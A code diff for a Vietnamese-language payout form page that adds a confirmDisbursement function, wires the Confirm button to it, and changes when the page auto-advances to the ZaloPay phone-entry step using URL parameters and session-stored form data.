@@ -691,7 +691,7 @@
         <footer class="page-footer">
           <button
             class="button primary"
-            onclick="showSection('zalopay-phone-section')"
+            onclick="confirmDisbursement()"
           >
             Xác nhận
           </button>
@@ -1315,12 +1315,10 @@
           });
         };
 
-        const autoAdvanceFromEvaluate = () => {
+        window.confirmDisbursement = () => {
+          showSection("zalopay-phone-section");
           const storedData =
             JSON.parse(sessionStorage.getItem("formData") || "{}");
-          if (storedData.methodKey !== "zalopay") return;
-
-          showSection("zalopay-phone-section");
           const phoneInput = getEl("zalopay-phone");
           const normalizedPhone = normalizePhoneForWallet(storedData.phone);
           if (normalizedPhone.length === 9) {
@@ -1329,6 +1327,21 @@
             return;
           }
           setTimeout(() => phoneInput.focus(), 150);
+        };
+
+        const shouldAutoAdvanceFromEvaluate = () => {
+          const params = new URLSearchParams(window.location.search);
+          const storedData =
+            JSON.parse(sessionStorage.getItem("formData") || "{}");
+          return (
+            params.get("from") === "evaluate" ||
+            storedData.methodKey === "zalopay"
+          );
+        };
+
+        const autoAdvanceFromEvaluate = () => {
+          if (!shouldAutoAdvanceFromEvaluate()) return;
+          confirmDisbursement();
         };
 
         // Initializer
